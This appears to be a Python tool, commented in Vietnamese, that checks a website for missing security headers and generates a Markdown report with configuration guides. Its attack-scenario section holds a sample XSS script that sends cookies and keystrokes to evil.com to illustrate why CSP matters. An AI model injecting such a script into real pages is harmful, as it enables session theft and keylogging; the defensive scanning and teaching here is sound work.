#!/usr/bin/env python3
"""
.\scanSecurityHeaders.py
Security Headers Scanner & Report Generator
Quét các security headers còn thiếu và tạo báo cáo chi tiết
"""

import requests
import sys
from datetime import datetime
from urllib.parse import urlparse

class SecurityHeadersScanner:
    def __init__(self, url):
        self.url = self.normalize_url(url)
        self.domain = urlparse(self.url).netloc
        self.scan_time = datetime.now()
        self.results = {}

        # Định nghĩa các security headers cần kiểm tra
        self.required_headers = {
            'Strict-Transport-Security': {
                'description': 'HSTS - Bắt buộc sử dụng HTTPS',
                'recommended': 'max-age=31536000; includeSubDomains; preload',
                'severity': 'High'
            },
            'Content-Security-Policy': {
                'description': 'CSP - Ngăn chặn XSS và data injection',
                'recommended': "default-src 'self'; script-src 'self'; object-src 'none'",
                'severity': 'High'
            },
            'X-Content-Type-Options': {
                'description': 'Ngăn chặn MIME type sniffing',
                'recommended': 'nosniff',
                'severity': 'Medium'
            },
            'X-Frame-Options': {
                'description': 'Chống clickjacking',
                'recommended': 'DENY',
                'severity': 'High'
            },
            'Referrer-Policy': {
                'description': 'Kiểm soát thông tin referrer',
                'recommended': 'strict-origin-when-cross-origin',
                'severity': 'Medium'
            },
            'Permissions-Policy': {
                'description': 'Kiểm soát browser features/APIs',
                'recommended': 'geolocation=(), microphone=(), camera=()',
                'severity': 'Low'
            },
            'X-XSS-Protection': {
                'description': 'Legacy XSS protection (deprecated)',
                'recommended': '1; mode=block',
                'severity': 'Low'
            }
        }

    def normalize_url(self, url):
        """Chuẩn hóa URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')

    def scan_headers(self):
        """Quét security headers"""
        print(f"\n{'='*70}")
        print(f"🔍 ĐANG QUÉT: {self.url}")
        print(f"{'='*70}\n")

        try:
            # Test GET request để lấy headers
            print("📤 Test 1: Gửi GET request để kiểm tra headers...")
            response = requests.get(self.url, timeout=10, allow_redirects=True)

            self.results['status_code'] = response.status_code
            self.results['headers'] = dict(response.headers)

            print(f"   ✓ Status Code: {response.status_code}")
            print(f"   ✓ Total Headers: {len(response.headers)}")

            # Kiểm tra từng security header
            print("\n📤 Test 2: Kiểm tra từng security header...")
            self.results['header_checks'] = self.check_security_headers(response.headers)

            # Phân tích rủi ro
            self.analyze_risk()

            print(f"\n{'='*70}")
            print(f"✅ QUÉT HOÀN TẤT")
            print(f"{'='*70}\n")

            return True

        except requests.exceptions.Timeout:
            print(f"❌ TIMEOUT - Không thể kết nối")
            return False
        except requests.exceptions.ConnectionError:
            print(f"❌ CONNECTION ERROR")
            return False
        except Exception as e:
            print(f"❌ LỖI: {str(e)}")
            return False

    def check_security_headers(self, headers):
        """Kiểm tra từng security header"""
        checks = {}

        for header_name, header_info in self.required_headers.items():
            header_value = None

            # Tìm header (case-insensitive)
            for key, value in headers.items():
                if key.lower() == header_name.lower():
                    header_value = value
                    break

            is_present = header_value is not None
            status = "✅" if is_present else "❌"

            print(f"   {status} {header_name}: {header_value or 'KHÔNG CÓ'}")

            checks[header_name] = {
                'present': is_present,
                'value': header_value,
                'recommended': header_info['recommended'],
                'description': header_info['description'],
                'severity': header_info['severity']
            }

        return checks

    def analyze_risk(self):
        """Phân tích mức độ rủi ro"""
        header_checks = self.results.get('header_checks', {})

        self.results['is_vulnerable'] = False
        self.results['risk_level'] = 'Low'
        self.results['cvss_score'] = 0.0
        self.results['protection_score'] = 0

        score = 0
        issues = []
        protections = []

        # Tính điểm dựa trên severity
        severity_weights = {
            'High': 30,
            'Medium': 20,
            'Low': 10
        }

        total_possible = sum(severity_weights.values()) * len([h for h, i in self.required_headers.items() if i['severity'] != 'Low'])

        for header_name, check in header_checks.items():
            severity = check['severity']
            weight = severity_weights.get(severity, 10)

            if check['present']:
                score += weight
                protections.append(f"{header_name}: {check['value'][:50]}")
            else:
                issues.append(f"Thiếu {header_name} ({check['description']})")

        # Tính % điểm
        max_score = sum(severity_weights[info['severity']] for info in self.required_headers.values())
        self.results['protection_score'] = int((score / max_score) * 100)

        self.results['issues'] = issues
        self.results['protections'] = protections

        # Count missing headers by severity
        missing_high = sum(1 for h, c in header_checks.items() if not c['present'] and c['severity'] == 'High')
        missing_medium = sum(1 for h, c in header_checks.items() if not c['present'] and c['severity'] == 'Medium')

        # Đánh giá tổng quan
        if missing_high >= 2:
            self.results['is_vulnerable'] = True
            self.results['risk_level'] = 'High'
            self.results['cvss_score'] = 5.3
            self.results['assessment'] = f'🔴 RỦI RO CAO - Thiếu {missing_high} headers quan trọng'
        elif missing_high >= 1:
            self.results['is_vulnerable'] = True
            self.results['risk_level'] = 'Medium'
            self.results['cvss_score'] = 4.3
            self.results['assessment'] = f'⚠️ RỦI RO TRUNG BÌNH - Thiếu {missing_high} header High severity'
        elif missing_medium >= 2:
            self.results['is_vulnerable'] = True
            self.results['risk_level'] = 'Medium'
            self.results['cvss_score'] = 3.7
            self.results['assessment'] = f'⚠️ CẦN CẢI THIỆN - Thiếu {missing_medium} headers Medium severity'
        else:
            self.results['is_vulnerable'] = False
            self.results['risk_level'] = 'Low'
            self.results['cvss_score'] = 0.0
            self.results['assessment'] = '✅ BẢO MẬT TỐT - Có đầy đủ security headers quan trọng'

    def generate_markdown_report(self):
        """Tạo báo cáo Markdown chi tiết"""

        report = f"""# 🔒 Phân tích kỹ thuật: "Security Headers Missing/Misconfigured"

**Ngày phân tích:** {self.scan_time.strftime('%d/%m/%Y %H:%M:%S')}
**Website:** {self.url}
**Domain:** {self.domain}
**Phân loại:** {"🔴 Issues Detected" if self.results['is_vulnerable'] else "✅ Well Protected"}

---

## 🚀 Quick Test Commands (Copy & Paste)

### Test nhanh bằng curl (10 giây):

```bash
# Test tất cả headers
curl -I {self.url} | grep -i "strict-transport\|content-security\|x-frame\|x-content\|referrer\|permissions"

# Hoặc xem tất cả headers
curl -I {self.url}
```

### Test bằng online tools:

```bash
# 1. SecurityHeaders.com (Tốt nhất)
https://securityheaders.com/?q={self.url}

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/{self.domain}

# 3. Scan lại bằng tool này
python3 scanSecurityHeaders.py {self.url}
```

---

## 📚 1. Tham chiếu chuẩn kỹ thuật

- **OWASP Top 10 2021:** A05:2021 – Security Misconfiguration
- **OWASP Secure Headers Project**
- **Mozilla Web Security Guidelines**
- **CWE-16:** Configuration

### Security Headers là gì?

**Security Headers** là các HTTP response headers giúp tăng cường bảo mật web application bằng cách:

1. **Kích hoạt các tính năng bảo mật của browser**
2. **Ngăn chặn các loại tấn công phổ biến** (XSS, clickjacking, etc.)
3. **Giảm thiểu attack surface**
4. **Tuân thủ security best practices**

**Tại sao quan trọng:**
- Modern browsers hỗ trợ nhiều security features
- Chỉ cần thêm headers → kích hoạt protection
- Chi phí thấp, hiệu quả cao
- Là yêu cầu của nhiều compliance standards (PCI-DSS, ISO 27001)

---

## 🧪 2. Kết quả kiểm tra thực tế

### Response Headers hiện tại:

```http
HTTP/1.1 {self.results['status_code']}
"""

        # Hiển thị tất cả headers
        for header, value in self.results['headers'].items():
            report += f"{header}: {value}\n"

        report += "```\n\n### Security Headers Analysis:\n\n"

        # Tạo bảng so sánh
        report += "| Header | Status | Current Value | Recommended | Severity |\n"
        report += "|--------|--------|---------------|-------------|----------|\n"

        header_checks = self.results.get('header_checks', {})
        for header_name, check in header_checks.items():
            status = "✅ CÓ" if check['present'] else "❌ THIẾU"
            current = f"`{check['value'][:40]}...`" if check['value'] and len(check['value']) > 40 else (f"`{check['value']}`" if check['value'] else "N/A")
            recommended = f"`{check['recommended'][:40]}...`" if len(check['recommended']) > 40 else f"`{check['recommended']}`"
            severity = f"🔴 {check['severity']}" if check['severity'] == 'High' else (f"⚠️ {check['severity']}" if check['severity'] == 'Medium' else f"ℹ️ {check['severity']}")

            report += f"| {header_name} | {status} | {current} | {recommended} | {severity} |\n"

        report += """

### Chi tiết từng header:

"""

        # Chi tiết từng header
        for header_name, check in header_checks.items():
            icon = "✅" if check['present'] else "❌"
            report += f"#### {icon} {header_name}\n\n"
            report += f"**Mô tả:** {check['description']}\n\n"

            if check['present']:
                report += f"**Giá trị hiện tại:** `{check['value']}`\n\n"
                report += "**Trạng thái:** ✅ Đã có\n\n"
            else:
                report += "**Trạng thái:** ❌ Thiếu\n\n"
                report += f"**Khuyến nghị:** `{check['recommended']}`\n\n"

            # Hướng dẫn cấu hình
            report += self._get_header_config_guide(header_name, check['recommended'])

        report += """

---

## 📊 3. So sánh: Có headers vs Không có headers

### ❌ Trường hợp THIẾU security headers (nguy hiểm):

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html
(Không có security headers)
```

**Rủi ro thực tế:**

1. **Thiếu HSTS:**
   - User có thể bị MITM attack khi truy cập qua HTTP
   - SSL stripping attacks thành công
   - Sensitive data có thể bị lộ

2. **Thiếu CSP:**
   - XSS attacks dễ dàng thực thi
   - Data injection không bị chặn
   - Third-party scripts có thể inject malicious code

3. **Thiếu X-Frame-Options:**
   - Dễ bị clickjacking
   - UI redressing attacks
   - Phishing thông qua iframe

4. **Thiếu X-Content-Type-Options:**
   - MIME type sniffing
   - Browser có thể execute malicious content
   - File upload vulnerabilities

### ✅ Trường hợp ĐẦY ĐỦ security headers (an toàn):

```http
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Bảo vệ:**
- ✅ Bắt buộc HTTPS (HSTS)
- ✅ Chặn XSS và data injection (CSP)
- ✅ Chống clickjacking (X-Frame-Options)
- ✅ Ngăn MIME sniffing (X-Content-Type-Options)
- ✅ Kiểm soát referrer information
- ✅ Hạn chế browser APIs nguy hiểm

"""

        # Trường hợp hiện tại
        score = self.results['protection_score']
        report += f"""### {"✅ Trường hợp AN TOÀN" if score >= 80 else "🔴 Trường hợp HIỆN TẠI"} (website đang kiểm tra):

**Điểm bảo mật:** {score}/100

"""

        if self.results.get('protections'):
            report += "**Headers đã có:**\n"
            for prot in self.results['protections']:
                report += f"- ✅ {prot}\n"
            report += "\n"

        if self.results.get('issues'):
            report += "**Headers còn thiếu:**\n"
            for issue in self.results['issues']:
                report += f"- ❌ {issue}\n"
            report += "\n"

        report += """

---

## 🎯 4. Kịch bản tấn công khi thiếu headers

### Kịch bản 1: XSS Attack (thiếu CSP)

```html
<!-- Attacker inject script vào comment/profile -->
<script>
  // Đánh cắp cookies
  fetch('https://evil.com/steal?c=' + document.cookie);

  // Keylogger
  document.addEventListener('keypress', e => {
    fetch('https://evil.com/log?key=' + e.key);
  });

  // Đổi nội dung trang
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

**Với CSP → Script bị chặn:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
→ Browser blocks inline scripts and eval()
```

### Kịch bản 2: SSL Stripping (thiếu HSTS)

```
1. User gõ: bank.com (không có https://)
2. Browser gửi request qua HTTP
3. Attacker MITM → Giữ connection HTTP
4. User nhập username/password qua HTTP
5. Credentials bị đánh cắp
```

**Với HSTS → Browser tự động upgrade:**
```http
Strict-Transport-Security: max-age=31536000
→ Browser luôn dùng HTTPS, không bao giờ HTTP
```

### Kịch bản 3: MIME Confusion (thiếu X-Content-Type-Options)

```javascript
// Attacker upload file: avatar.jpg
// Thực chất là: malicious.html với MIME type image/jpeg

// Browser sniff content → Phát hiện HTML → Execute script
// User visit /uploads/avatar.jpg → XSS

// Với X-Content-Type-Options: nosniff
// → Browser tuân thủ Content-Type, không execute
```

---

## 📋 5. Bảng đánh giá bảo vệ

| Tiêu chí | Kết quả | Đánh giá |
|----------|---------|----------|
"""

        # Đánh giá từng severity level
        header_checks = self.results.get('header_checks', {})

        high_present = sum(1 for h, c in header_checks.items() if c['present'] and c['severity'] == 'High')
        high_total = sum(1 for h, c in header_checks.items() if c['severity'] == 'High')

        medium_present = sum(1 for h, c in header_checks.items() if c['present'] and c['severity'] == 'Medium')
        medium_total = sum(1 for h, c in header_checks.items() if c['severity'] == 'Medium')

        low_present = sum(1 for h, c in header_checks.items() if c['present'] and c['severity'] == 'Low')
        low_total = sum(1 for h, c in header_checks.items() if c['severity'] == 'Low')

        high_status = "✅" if high_present == high_total else "❌"
        medium_status = "✅" if medium_present == medium_total else "⚠️"
        low_status = "✅" if low_present == low_total else "ℹ️"

        report += f"| High Severity Headers | {high_status} {high_present}/{high_total} | {'Đầy đủ' if high_present == high_total else 'Còn thiếu'} |\n"
        report += f"| Medium Severity Headers | {medium_status} {medium_present}/{medium_total} | {'Đầy đủ' if medium_present == medium_total else 'Cần bổ sung'} |\n"
        report += f"| Low Severity Headers | {low_status} {low_present}/{low_total} | {'Đầy đủ' if low_present == low_total else 'Nên có'} |\n"

        report += f"\n**Tổng điểm bảo mật:** {self.results['protection_score']}/100\n\n"

        if self.results['protection_score'] >= 90:
            report += "✅ **Đánh giá:** XUẤT SẮC - Security headers đầy đủ\n"
        elif self.results['protection_score'] >= 70:
            report += "⚠️ **Đánh giá:** TỐT - Còn một số headers cần bổ sung\n"
        elif self.results['protection_score'] >= 50:
            report += "⚠️ **Đánh giá:** TRUNG BÌNH - Thiếu nhiều headers quan trọng\n"
        else:
            report += "🔴 **Đánh giá:** YẾU - Cần bổ sung security headers ngay\n"

        report += """

---

## 🔧 6. Biện pháp khắc phục

### Hướng dẫn thêm từng header:

"""

        # Hướng dẫn implement cho từng header thiếu
        for header_name, check in header_checks.items():
            if not check['present']:
                report += f"#### Thêm {header_name}\n\n"
                report += self._get_header_config_guide(header_name, check['recommended'])

        report += """

### Cấu hình tổng hợp (All-in-one):

**Nginx:**
```nginx
# /etc/nginx/sites-available/your-site
server {
    listen 443 ssl http2;
    server_name """ + self.domain + """;

    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Ẩn server version
    server_tokens off;

    ...
}
```

**Apache (.htaccess hoặc httpd.conf):**
```apache
<IfModule mod_headers.c>
    # HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

    # CSP
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"

    # Other headers
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
    Header always set X-XSS-Protection "1; mode=block"
</IfModule>

# Ẩn server version
ServerTokens Prod
ServerSignature Off
```

**Node.js (Express + Helmet):**
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Helmet tự động thêm security headers
app.use(helmet({
  strictTransportSecurity: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", "data:"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  frameguard: { action: 'deny' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    features: {
      geolocation: [],
      microphone: [],
      camera: []
    }
  }
}));

app.listen(3000);
```

**Next.js (next.config.js):**
```javascript
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=31536000; includeSubDomains; preload'
          },
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          {
            key: 'Permissions-Policy',
            value: 'geolocation=(), microphone=(), camera=()'
          }
        ],
      },
    ]
  },
}
```

**Vercel (vercel.json):**
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; object-src 'none';"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "geolocation=(), microphone=(), camera=()"
        }
      ]
    }
  ]
}
```

**Cloudflare Workers:**
```javascript
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const response = await fetch(request)
  const newHeaders = new Headers(response.headers)

  // Add security headers
  newHeaders.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload')
  newHeaders.set('Content-Security-Policy', "default-src 'self'; script-src 'self';")
  newHeaders.set('X-Frame-Options', 'DENY')
  newHeaders.set('X-Content-Type-Options', 'nosniff')
  newHeaders.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  newHeaders.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()')

  return new Response(response.body, {
    status: response.status,
    headers: newHeaders
  })
}
```

**⚠️ Lưu ý quan trọng:**

1. **CSP có thể break website:**
   - Test kỹ trong staging environment
   - Bắt đầu với report-only mode:
     ```
     Content-Security-Policy-Report-Only: ...
     ```
   - Sau khi verify không có vấn đề → chuyển sang enforce mode

2. **HSTS preload:**
   - Chỉ submit vào preload list khi chắc chắn
   - Rất khó để revert
   - Đảm bảo tất cả subdomains đều support HTTPS

3. **Testing:**
   - Test trên nhiều browsers (Chrome, Firefox, Safari, Edge)
   - Check DevTools Console cho errors
   - Verify functionality không bị ảnh hưởng

---

## ✅ 7. Kiểm tra lại sau khi khắc phục

### Bước 1: Kiểm tra bằng curl

```bash
# Kiểm tra từng header
curl -I """ + self.url + """ | grep -i "strict-transport\|content-security\|x-frame\|x-content\|referrer\|permissions"

# Hoặc xem tất cả headers
curl -I """ + self.url + """
```

### Bước 2: Test bằng Browser DevTools

```javascript
// Chrome/Firefox DevTools Console
fetch(window.location.href)
  .then(r => {
    console.log('Strict-Transport-Security:', r.headers.get('strict-transport-security'));
    console.log('Content-Security-Policy:', r.headers.get('content-security-policy'));
    console.log('X-Frame-Options:', r.headers.get('x-frame-options'));
    console.log('X-Content-Type-Options:', r.headers.get('x-content-type-options'));
    console.log('Referrer-Policy:', r.headers.get('referrer-policy'));
    console.log('Permissions-Policy:', r.headers.get('permissions-policy'));
  });
```

### Bước 3: Online Security Scanners

```bash
# 1. SecurityHeaders.com (Tốt nhất - cho điểm A-F)
https://securityheaders.com/?q=""" + self.url + """

# 2. Mozilla Observatory
https://observatory.mozilla.org/analyze/""" + self.domain + """

# 3. SSL Labs (cho HSTS)
https://www.ssllabs.com/ssltest/analyze.html?d=""" + self.domain + """

# 4. Scan lại bằng tool này
python3 scanSecurityHeaders.py """ + self.url + """
```

### Bước 4: CSP Validator

```bash
# Validate CSP syntax
https://csp-evaluator.withgoogle.com/

# Paste CSP policy để check syntax và security issues
```

### Bước 5: Automated Testing

```javascript
// Playwright/Puppeteer test
const { test, expect } = require('@playwright/test');

test('All security headers present', async ({ page }) => {
  const response = await page.goto('""" + self.url + """');

  const headers = response.headers();

  expect(headers['strict-transport-security']).toBeTruthy();
  expect(headers['content-security-policy']).toBeTruthy();
  expect(headers['x-frame-options']).toBeTruthy();
  expect(headers['x-content-type-options']).toBe('nosniff');
  expect(headers['referrer-policy']).toBeTruthy();
});
```

---

## 📊 8. Kết luận và khuyến nghị

### Đánh giá tổng quan:

"""

        if self.results['is_vulnerable']:
            report += f"""🔴 **Website CẦN CẢI THIỆN SECURITY HEADERS**

**Điểm bảo mật:** {self.results['protection_score']}/100
**Mức độ rủi ro:** {self.results['risk_level']}
**CVSS Score:** {self.results['cvss_score']}

**Headers còn thiếu:**
"""
            for issue in self.results.get('issues', []):
                report += f"- ❌ {issue}\n"

            report += """
**Tác động:**
- Giảm khả năng chống các tấn công phổ biến
- Không tận dụng được security features của browser
- Vi phạm security best practices
- Có thể fail security audit/compliance

**Hành động khuyến nghị:**
1. 🔴 **PRIORITY HIGH** - Thêm HSTS và CSP ngay lập tức
2. ⚠️ **PRIORITY MEDIUM** - Thêm X-Frame-Options và X-Content-Type-Options
3. ℹ️ **PRIORITY LOW** - Bổ sung các headers còn lại
4. 🧪 **TEST** - Verify không ảnh hưởng functionality
5. 📊 **MONITOR** - Regular scan để maintain security posture
"""
        else:
            report += f"""✅ **Website CÓ BẢO MẬT TỐT**

**Điểm bảo mật:** {self.results['protection_score']}/100
**Mức độ rủi ro:** {self.results['risk_level']}

**Security headers đã có:**
"""
            for prot in self.results.get('protections', []):
                report += f"- ✅ {prot}\n"

            report += """
**Đánh giá:**
- Website có security headers đầy đủ
- Tận dụng tốt browser security features
- Tuân thủ security best practices
- Sẵn sàng cho security audit

**Hành động khuyến nghị:**
1. ✅ **MAINTAIN** - Duy trì cấu hình hiện tại
2. 🔄 **UPDATE** - Regular review và update CSP policy
3. 📊 **MONITOR** - Quarterly security scan
4. 📝 **DOCUMENT** - Lưu configuration cho team
"""

        report += """

---

## 🔗 References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [HSTS Preload List](https://hstspreload.org/)
- [SecurityHeaders.com](https://securityheaders.com/)

---

**Prepared by:** Security Headers Scanner
**Scan Time:** """ + self.scan_time.strftime('%Y-%m-%d %H:%M:%S') + """
**Report Version:** 1.0
**Tool Version:** 1.0.0
"""

        return report

    def _get_header_config_guide(self, header_name, recommended_value):
        """Lấy hướng dẫn cấu hình cho header cụ thể"""

        guides = {
            'Strict-Transport-Security': """
**Nginx:**
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**Apache:**
```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```
""",
            'Content-Security-Policy': """
**Nginx:**
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';" always;
```

**Apache:**
```apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```
""",
            'X-Frame-Options': """
**Nginx:**
```nginx
add_header X-Frame-Options "DENY" always;
```

**Apache:**
```apache
Header always set X-Frame-Options "DENY"
```
""",
            'X-Content-Type-Options': """
**Nginx:**
```nginx
add_header X-Content-Type-Options "nosniff" always;
```

**Apache:**
```apache
Header always set X-Content-Type-Options "nosniff"
```
""",
            'Referrer-Policy': """
**Nginx:**
```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**Apache:**
```apache
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```
""",
            'Permissions-Policy': """
**Nginx:**
```nginx
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
```

**Apache:**
```apache
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
```
""",
            'X-XSS-Protection': """
**Nginx:**
```nginx
add_header X-XSS-Protection "1; mode=block" always;
```

**Apache:**
```apache
Header always set X-XSS-Protection "1; mode=block"
```
"""
        }

        return guides.get(header_name, "")

    def save_report(self, filename=None):
        """Lưu báo cáo ra file"""
        if filename is None:
            timestamp = self.scan_time.strftime('%Y%m%d_%H%M%S')
            filename = f"security_headers_report_{self.domain}_{timestamp}.md"

        report_content = self.generate_markdown_report()

        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(report_content)

            print(f"✅ Đã lưu báo cáo: {filename}")
            return filename
        except Exception as e:
            print(f"❌ Lỗi khi lưu file: {str(e)}")
            return None

def main():
    print("="*70)
    print("🛡️  SECURITY HEADERS SCANNER")
    print("="*70)
    print("Công cụ quét security headers và tạo báo cáo chi tiết")
    print("="*70 + "\n")

    # Lấy URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input("🔍 Nhập URL cần quét: ").strip()

    if not url:
        print("❌ Vui lòng nhập URL!")
        return

    # Khởi tạo scanner
    scanner = SecurityHeadersScanner(url)

    # Chạy scan
    success = scanner.scan_headers()

    if not success:
        print("❌ Quét thất bại!")
        return

    # Hiển thị tóm tắt
    print("\n" + "="*70)
    print("📊 TÓM TẮT KẾT QUẢ")
    print("="*70)
    print(f"Website: {scanner.url}")
    print(f"Đánh giá: {scanner.results['assessment']}")
    print(f"Mức độ rủi ro: {scanner.results['risk_level']}")
    print(f"Điểm bảo mật: {scanner.results['protection_score']}/100")
    print(f"CVSS Score: {scanner.results['cvss_score']}")

    # Thống kê headers
    header_checks = scanner.results.get('header_checks', {})
    present_count = sum(1 for c in header_checks.values() if c['present'])
    total_count = len(header_checks)

    print(f"\nSecurity Headers:")
    print(f"  • Đã có: {present_count}/{total_count}")
    print(f"  • Còn thiếu: {total_count - present_count}/{total_count}")

    print("\n" + "-"*70)
    if scanner.results['is_vulnerable']:
        print("⚠️ CẦN CẢI THIỆN - Thiếu security headers!")
        print("\nHeaders còn thiếu:")
        for issue in scanner.results.get('issues', []):
            print(f"  ❌ {issue}")
    else:
        print("✅ TỐT - Security headers đầy đủ!")
        if scanner.results.get('protections'):
            print("\nHeaders đã có:")
            for prot in scanner.results.get('protections', [])[:3]:  # Show first 3
                print(f"  ✅ {prot[:60]}...")

    print("="*70 + "\n")

    # Hỏi có muốn lưu báo cáo không
    save = input("💾 Bạn có muốn lưu báo cáo chi tiết? (y/n): ").strip().lower()

    if save in ['y', 'yes', 'có']:
        custom_name = input("📝 Nhập tên file (Enter để dùng tên mặc định): ").strip()
        filename = custom_name if custom_name else None

        saved_file = scanner.save_report(filename)

        if saved_file:
            print(f"\n✅ Hoàn tất! Xem báo cáo tại: {saved_file}")
    else:
        print("\n📋 Báo cáo không được lưu.")

    print("\n" + "="*70)
    print("🎯 BƯỚC TIẾP THEO")
    print("="*70)

    if scanner.results['is_vulnerable']:
        print("""
1. Đọc kỹ phần "Biện pháp khắc phục" trong báo cáo
2. Implement headers theo priority (High → Medium → Low)
3. Test kỹ trên staging environment
4. Deploy production
5. Scan lại để verify

🔗 Tools hữu ích:
   - https://securityheaders.com/
   - https://observatory.mozilla.org/
        """)
    else:
        print("""
1. Maintain cấu hình hiện tại
2. Regular review CSP policy
3. Quarterly security scan
4. Monitor cho policy violations
        """)

    print("="*70 + "\n")

if __name__ == "__main__":
    main()
